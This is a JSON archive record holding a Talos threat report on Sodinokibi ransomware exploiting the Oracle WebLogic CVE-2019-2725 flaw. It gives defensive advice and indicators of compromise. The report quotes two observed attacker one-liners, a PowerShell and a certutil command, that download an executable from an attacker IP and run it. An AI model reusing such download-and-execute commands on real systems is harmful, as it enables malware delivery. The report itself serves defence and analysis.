{
    "id": "559a21b1-66a8-47e1-be75-21031abfd6a5",
    "created_at": "2023-01-12T14:58:51.561566Z",
    "updated_at": "2025-03-27T02:05:49.826064Z",
    "deleted_at": null,
    "sha1_hash": "896c935eea8bb08878bcfcf9d08ebba39d053a3f",
    "title": "2019-04-30 - Sodinokibi ransomware exploits WebLogic Server vulnerability",
    "authors": "",
    "file_creation_date": "2022-05-27T22:08:11Z",
    "file_modification_date": "2022-05-27T22:08:11Z",
    "file_size": 872747,
    "plain_text": "# Sodinokibi ransomware exploits WebLogic Server vulnerability\n\n**[blog.talosintelligence.com/2019/04/sodinokibi-ransomware-exploits-weblogic.html](https://blog.talosintelligence.com/2019/04/sodinokibi-ransomware-exploits-weblogic.html)**\n\n_This blog was authored by_ _[Pierre Cadieux,](https://twitter.com/pchobbit)_ _[Colin Grady,](https://twitter.com/ColinGrady)_ _[Jaeson Schultz and](https://twitter.com/jaesonschultz)_ _[Matt Valites](https://twitter.com/matthewvalites)_\n\nAttackers are actively exploiting a recently disclosed vulnerability in Oracle WebLogic to\ninstall a new variant of ransomware called \"Sodinokibi.\" Sodinokibi attempts to encrypt data\nin a user's directory and delete shadow copy backups to make data recovery more difficult.\nOracle first patched the issue on April 26, outside of their normal patch cycle, and assigned it\n[CVE-2019-2725. This vulnerability is easy for attackers to exploit, as anyone with HTTP](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html)\naccess to the WebLogic server could carry out an attack. Because of this, the bug has a\nCVSS score of 9.8/10. Attackers have been making use of this exploit in the wild since at\nleast [April 17. Cisco's](https://isc.sans.edu/forums/diary/Unpatched+Vulnerability+Alert+WebLogic+Zero+Day/24880/) [Incident Response (IR) team, along with Cisco Talos, are actively](https://www.cisco.com/c/en/us/products/security/sas-incident-response.html)\ninvestigating these attacks and Sodinokibi.\n\n\n-----\n\nInitial stages of the ransomware attack occurred on April 25, the day before Oracle released\ntheir update. This was a trial to see whether the server was exploitable.\n\n\n-----\n\n_April 25, 2019 activity showing the initial activity preceding the ransomware deployment._\n\nOn April 26, 2019, the attackers made an HTTP connection to a different vulnerable server,\nrequesting the AsyncResponderService of the Oracle WebLogic Server.\n\n\n-----\n\n_Activity from April 26. The attackers are downloading the Sodinokibi ransomware._\n\nHistorically, most varieties of ransomware have required some form of user interaction, such\nas a user opening an attachment to an email message, clicking on a malicious link, or\nrunning a piece of malware on the device. In this case, the attackers simply leveraged the\nOracle WebLogic vulnerability, causing the affected server to download a copy of the\nransomware from attacker-controlled IP addresses 188.166.74[.]218 and 45.55.211[.]79. The\n188.166.74[.]218 IP address is also home to a pair of other malicious domains unrelated to\n[this ransomware attack: arg0s-co[.]uk, which is likely a phishing domain, and](https://www.phishtank.com/phish_detail.php?phish_id%3D6005605)\nprojectstore[.]guru, a domain with bogus PDF-related Google search results. The other IP,\n45.55.211[.]79, hosts a pair of legitimate Chilean domains, and appears to have been\ninfected and repurposed by the attackers. The attackers were ultimately successful at\nencrypting a number of systems during this incident.\n\nCisco IR Services and Talos observed the attack requests originating from 130.61.54[.]136.\nThe HTTP POST request contained arguments to a cmd.exe instruction â€” a PowerShell\ncommand to download a file called \"radm.exe\" from host 188.166.74[.]218, then save that file\nlocally and execute it.\n```\ncmd /c powershell.exe wget http[:]//188.166.74[.]218/radm.exe -outfile\n%TEMP%/radm.exe&cmd.exe /c %TEMP%\\\\radm.exe\n\n```\n\n-----\n\nIn addition to PowerShell, we also observed the attackers creatively passing the certutil utility\nto cmd to download a file:\n```\ncmd /c cmd.exe /c certutil.exe -urlcache -split -f http[:]//188.166.74[.]218/radm.exe\n%TEMP%/radm.exe&cmd.exe /c %TEMP%\\\\radm.exe\n\n```\nBesides \"radm.exe,\" researchers observed multiple file names in the PowerShell and certutil\ncommands, including:\n\nhxxp[:]//188.166.74[.]218/office.exe\nhxxp[:]//188.166.74[.]218/radm.exe\nhxxp[:]//188.166.74[.]218/untitled.exe\nhxxp[:]//45.55.211[.]79/.cache/untitled.exe\n\n[Once detonated in Threat Grid, the sandbox identified this sample as potential ransomware.](https://panacea.threatgrid.com/mask/samples/fbb1cc7a40ef2254f31ee800a00a0a5d)\n\nThe website VirusTotal successfully detected the same binary hash on 43 out of 71 different\nengines.\n\nBelow, we can see the malicious file \"untitled.exe\" using \"cmd.exe\" to execute the\nvssadmin.exe utility. This action is a common tactic of ransomware to prevent users from\neasily recovering their data. It attempts to delete default Windows backup mechanisms,\notherwise known as \"shadow copies,\" to prevent recovery of the original files from these\nbackups.\n\n\n-----\n\nThe ransom note, in this case, directs victims to either a .onion website on the Tor network or\non the public web at the domain decryptor[.]top, registered on March 31 this year. With\nSodinokibi, each encrypted system sees a distinct encrypted file extension. The ransom note\nfilename also includes this extension as a prefix (ex. 88f2947s-HOW-TO-DECRYPT.txt).\n\n\n-----\n\n## The Gandcrab affiliate connection\n\nAfter finishing deploying Sodinokibi ransomware inside the victim's network, the attackers\nfollowed up with an additional CVE-2019-2725 exploit attempt approximately eight hours\nlater. However, this time, the attackers chose to distribute Gandcrab v5.2. We find it strange\nthe attackers would choose to distribute additional, different ransomware on the same target.\nSodinokibi being a new flavor of ransomware, perhaps the attackers felt their earlier attempts\nhad been unsuccessful and were still looking to cash in by distributing Gandcrab.\n\n## Conclusion\n\nThis attack is notable because of the attackers' use of a zero-day exploit to distribute\n[ransomware. Whereas previously we have witnessed ransomware attackers taking](https://blog.talosintelligence.com/2016/03/samsam-ransomware.html)\nadvantage of unpatched systems to install and laterally propagate ransomware, this zero-day\nexploitation method could work on otherwise fully-patched systems.\n\n\n-----\n\nThe victims in this ransomware attack were able to activate their Incident Response Retainer\nwith Cisco IR Services, and they received immediate support and advice on managing the\nincident. Immediate actions taken likely prevented a more significant outage.\n\nDue to the ubiquity of Oracle WebLogic servers and the ease of exploitation of this\nvulnerability, Talos expects widespread attacks involving CVE-2019-2725, and we\nrecommend the following actions. Any number of layered controls could prevent or otherwise\ndeter this type of attack, including:\n\nPatch WebLogic as soon as possible against CVE-2019-2725.\nLog and centrally collect web, application, and operating systems events.\nRestrict the access of the account used to run the WebLogic process\nMonitor for signs of compromise:\n\nEgress network communications from data center systems.\nRansomware \"Canary\" files.\nExternal HTTP POSTs to new URIs.\nWeb shells.\nUnexpected activity of service/system accounts (WebLogic user).\n\nScan for, understand, and mitigate your vulnerability posture.\nRestrict egress Data Center communications.\nSegment the network for defense and monitoring.\nControl URL access (in this case external access to \"/_async/*\" and \"/wls-wsat/*\").\nPlan for Disaster Recovery, including maintaining and testing data backups and\nrecovery.\nConfigure PowerShell to execute only signed scripts.\n\n## Indicators of Compromise (IoC)\n\n**Ransomware samples:**\n\n0fa207940ea53e2b54a2b769d8ab033a6b2c5e08c78bf4d7dade79849960b54d\n\n34dffdb04ca07b014cdaee857690f86e490050335291ccc84c94994fa91e0160\n\n74bc2f9a81ad2cc609b7730dbabb146506f58244e5e655cbb42044913384a6ac\n\n95ac3903127b74f8e4d73d987f5e3736f5bdd909ba756260e187b6bf53fb1a05\n\nfa2bccdb9db2583c2f9ff6a536e824f4311c9a8a9842505a0323f027b8b51451\n\n**Distribution URLs:**\n\nhxxp://188.166.74[.]218/office.exe\n\nhxxp://188.166.74[.]218/radm.exe\n\nhxxp://188.166.74[.]218/untitled.exe\n\nhxxp://45.55.211[.]79/.cache/untitled.exe\n\n\n-----\n\n**Attacker IP:**\n130.61.54[.]136\n\n**Attacker Domain:**\ndecryptor[.]top\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-04-30 - Sodinokibi ransomware exploits WebLogic Server vulnerability.pdf"
    ],
    "report_names": [
        "2019-04-30 - Sodinokibi ransomware exploits WebLogic Server vulnerability.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535531,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653689291,
    "ts_modification_date": 1653689291,
    "files": {
        "pdf": "https://archive.orkl.eu/896c935eea8bb08878bcfcf9d08ebba39d053a3f.pdf",
        "text": "https://archive.orkl.eu/896c935eea8bb08878bcfcf9d08ebba39d053a3f.txt",
        "img": "https://archive.orkl.eu/896c935eea8bb08878bcfcf9d08ebba39d053a3f.jpg"
    }
}